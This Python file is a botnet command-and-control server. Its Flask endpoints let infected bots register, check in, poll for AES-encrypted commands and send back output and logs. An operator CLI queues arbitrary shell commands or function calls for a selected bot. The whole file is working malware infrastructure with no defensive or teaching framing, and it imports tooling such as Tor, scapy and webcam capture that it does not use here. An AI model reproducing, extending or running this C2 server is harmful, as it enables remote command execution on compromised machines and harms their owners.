import os
import sys
import socket
import subprocess
import base64
import json
import time
import random
import threading
import platform
import socks
import logging
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from scapy.all import sr, IP, ICMP, TCP, ARP, Ether
from netaddr import IPNetwork, IPAddress
import requests
import stem
import shutil
import getpass
import argparse
import zipfile, io
import urllib.request, ipaddress
import tarfile
import cv2
import psutil
from subprocess import Popen, PIPE
import csv
import stat
from flask import Flask, request, jsonify, send_from_directory

app = Flask(__name__)

# --- Configuration ---
ENCRYPTION_KEY = b'sixteen byte key'

# --- Logging ---
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(threadName)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger('C2')

# --- Bot Management ---
bots = {}
commands = {}

# --- Encryption/Decryption ---
def encrypt_data(data):
    logger.debug(f"Encrypting data of length {len(data)} bytes.")
    try:
        cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
        iv = base64.b64encode(cipher.iv).decode('utf-8')
        ct = base64.b64encode(ct_bytes).decode('utf-8')
        encrypted_string = iv + ct
        logger.debug(f"Encryption successful. Result length: {len(encrypted_string)}")
        return encrypted_string
    except Exception:
        logger.exception("An unexpected error occurred during data encryption.")
        raise

def decrypt_data(encrypted_data):
    logger.debug(f"Decrypting data of length {len(encrypted_data)} bytes.")
    try:
        iv = base64.b64decode(encrypted_data[:24])
        ct = base64.b64decode(encrypted_data[24:])
        cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        decrypted_string = pt.decode()
        logger.debug(f"Decryption successful. Result length: {len(decrypted_string)}")
        return decrypted_string
    except Exception:
        logger.exception("An unexpected error occurred during data decryption.")
        raise

# --- API Endpoints ---
@app.route('/api/bot/register', methods=['POST'])
def register_bot():
    encrypted_data = request.data
    decrypted_data = decrypt_data(encrypted_data)
    data = json.loads(decrypted_data)
    bot_id = data.get('id')
    info = data.get('info')
    public_ip = info.get('ip')
    bots[bot_id] = {'info': info, 'last_seen': time.time(), 'public_ip': public_ip, 'status': 'green'}
    logger.info(f"Registered new bot: {bot_id} with public IP: {public_ip}")
    return jsonify({'status': 'ok'})

@app.route('/api/bot/ping', methods=['POST'])
def ping():
    encrypted_data = request.data
    decrypted_data = decrypt_data(encrypted_data)
    data = json.loads(decrypted_data)
    bot_id = data.get('id')
    if bot_id in bots:
        bots[bot_id]['last_seen'] = time.time()
        logger.info(f"Received ping from bot: {bot_id}")
        return jsonify({'status': 'ok', 'output': 'pong'})
    else:
        logger.warning(f"Received ping from unknown bot: {bot_id}")
        return jsonify({'status': 'error', 'output': 'not registered'})

@app.route('/api/bot/poll/<bot_id>', methods=['GET'])
def poll_commands(bot_id):
    if bot_id in commands and commands[bot_id]:
        command = commands[bot_id].pop(0)
        encrypted_command = encrypt_data(json.dumps(command))
        logger.info(f"Sending command to bot {bot_id}: {command}")
        return encrypted_command
    else:
        return jsonify({'status': 'ok', 'output': 'no commands'})

@app.route('/api/bot/response/<bot_id>', methods=['POST'])
def receive_response(bot_id):
    encrypted_data = request.data
    decrypted_data = decrypt_data(encrypted_data)
    data = json.loads(decrypted_data)
    command_id = data.get('command_id')
    output = data.get('output')
    logger.info(f"Received response from bot {bot_id} for command {command_id}: {output}")
    return jsonify({'status': 'ok'})

@app.route('/api/bot/log/<bot_id>', methods=['POST'])
def receive_log(bot_id):
    log_entry = request.data.decode()
    logger.info(f"[BOT LOG - {bot_id}] {log_entry}")
    return jsonify({'status': 'ok'})

@app.route('/api/bots')
def get_bots():
    return jsonify(bots)

# --- C2 CLI ---
def print_bots():
    print("--- Registered Bots ---")
    for bot_id, bot_info in bots.items():
        print(f"ID: {bot_id}, Info: {bot_info['info']}, Last Seen: {time.ctime(bot_info['last_seen'])}")

def issue_command():
    bot_id = input("Enter bot ID to command: ")
    if bot_id not in bots:
        print("Invalid bot ID.")
        return

    command_type = input("Enter command type (command/function): ")
    if command_type == 'command':
        command = input("Enter command to execute: ")
        command_obj = {'type': 'command', 'command': command, 'command_id': random.randint(1000, 9999)}
    elif command_type == 'function':
        function_name = input("Enter function name: ")
        params_str = input("Enter params (JSON format): ")
        try:
            params = json.loads(params_str)
        except json.JSONDecodeError:
            print("Invalid JSON format for params.")
            return
        command_obj = {'type': 'function', 'function': function_name, 'params': params, 'command_id': random.randint(1000, 9999)}
    else:
        print("Invalid command type.")
        return

    if bot_id not in commands:
        commands[bot_id] = []
    commands[bot_id].append(command_obj)
    print(f"Command issued to bot {bot_id}.")

def main():
    # Start Flask server in a separate thread
    flask_thread = threading.Thread(target=app.run, kwargs={'host': '0.0.0.0', 'port': 5000})
    flask_thread.daemon = True
    flask_thread.start()

    while True:
        print("\n--- C2 CLI ---")
        print("1. List bots")
        print("2. Issue command")
        print("3. Exit")
        choice = input("Enter your choice: ")

        if choice == '1':
            print_bots()
        elif choice == '2':
            issue_command()
        elif choice == '3':
            sys.exit(0)
        else:
            print("Invalid choice.")

@app.route('/')
def index():
    return send_from_directory('WEB-GUI', 'GUI-index.html')

@app.route('/<module>')
def module_page(module):
    return send_from_directory(os.path.join('WEB-GUI', module), 'index.html')

@app.route('/GUI-style.css')
def style():
    return send_from_directory('WEB-GUI', 'GUI-style.css')

if __name__ == '__main__':
    main()